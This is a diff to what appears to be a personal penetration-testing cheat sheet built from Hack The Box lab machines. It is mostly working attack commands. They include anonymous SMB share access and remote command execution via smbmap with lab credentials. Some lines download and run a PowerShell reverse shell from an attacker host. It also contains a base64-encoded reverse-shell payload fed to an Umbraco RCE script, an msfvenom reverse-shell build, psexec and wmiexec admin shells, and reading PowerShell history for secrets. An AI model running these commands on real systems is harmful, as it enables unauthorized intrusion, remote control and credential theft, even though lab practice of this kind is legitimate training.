@@ -5,6 +5,9 @@
 3.  CURL
 4. Ways to get the shell 
 5. PowerShell and AD
+6. PowerView and SharpView //Need to add as you go
+7. BloodHound //Need to add as you go
+8. SharpHound //Need to add as you go
 
 ### Links
 
@@ -45,7 +48,51 @@ Listing the SMB Shares without password using smbclient
 
 ```
 $ smbclient --no-pass -L 10.10.10.134
+$ smbclient --no-pass -L //<IP> # Null user
 ```
+
+Listing SMB Share using Password or NTLM hash
+```
+$ smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+```
+
+Connecting to specific SMB Share without username and password - Anonymously Accessing SMB Share
+```
+# smbclient //10.10.11.174/support-tools            
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:1
+```
+
+Getting the file from SMB Share without password anonymously 
+```
+──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
+└─# smbclient //10.10.11.174/support-tools -c 'get putty.exe' 
+Password for [WORKGROUP\root]:
+getting file \putty.exe of size 1273576 as putty.exe (1294.2 KiloBytes/sec) (average 1294.2 KiloBytes/sec)
+
+┌──(root㉿kali)-[/home/ringbuffer/Downloads/Support.htb]
+└─# ls                                                        
+putty.exe
+```
+
+Command Execution using smbmap: The `-d` switch can be avoided. 
+```
+# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -d NEST.HTB -x 'net user' -H 10.10.10.178   
+```
+
+smbmap - Non Recursive Path Listing
+```
+# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith/HQK Reporting' -H 10.10.10.178
+```
+
+Get a Reverse shell using `smbmap`. Make sure python server and nc listener is running.
+```
+# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
+```
+
 
 ### Nmap
 
@@ -89,6 +136,7 @@ Getting Shell from RCE was achieved as follows
 python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-e JExIT1NUID0gIjEwLjEwLjE2LjUiOyAkTFBPUlQgPSA0NDQ0OyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp'
 
 ## Successful Attempt
+
 $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o revshell.exe
 $ impacket-smbserver a /home/ringbuffer/Downloads/Remote.htb -smb2support
 $ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'net use \\10.10.14.4\a'
@@ -97,26 +145,6 @@ $ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10
 ```
 
 During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.
-
-Using `Impacket-psexec`
-
-```
-$ impacket-psexec 'Administrator:!R3m0te!@10.10.10.180' 
-Impacket v0.12.0.dev1 - Copyright 2023 Fortra
-
-[*] Requesting shares on 10.10.10.180.....
-[*] Found writable share ADMIN$
-[*] Uploading file gZTCDlfJ.exe
-[*] Opening SVCManager on 10.10.10.180.....
-[*] Creating service xWJX on 10.10.10.180.....
-[*] Starting service xWJX.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32> whoami
-nt authority\system
-```
 
 Using `impacket-wmiexec`
 ```
@@ -139,13 +167,12 @@ Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password 
 Using Telnet
 ```
 $ telnet access.htb
-Trying 10.10.10.98...
-Connected to access.htb.
-Escape character is '^]'.
-*===============================================================
-Microsoft Telnet Server.
-*===============================================================
 C:\Users\security>
+```
+
+Using `smbmap` to run powershell command
+```
+# smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178
 ```
 ### PowerShell & Active Directory
 
@@ -174,3 +201,7 @@ Copy the whole PowerSploit Directory as follows
 *Evil-WinRM* PS C:\tmp\PowerSploit> Copy-Item PowerSploit "C:\Program Files\WindowsPowerShell\Modules" -recurse -Force
 ```
 
+Checking the PowerShell history
+```
+*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+```
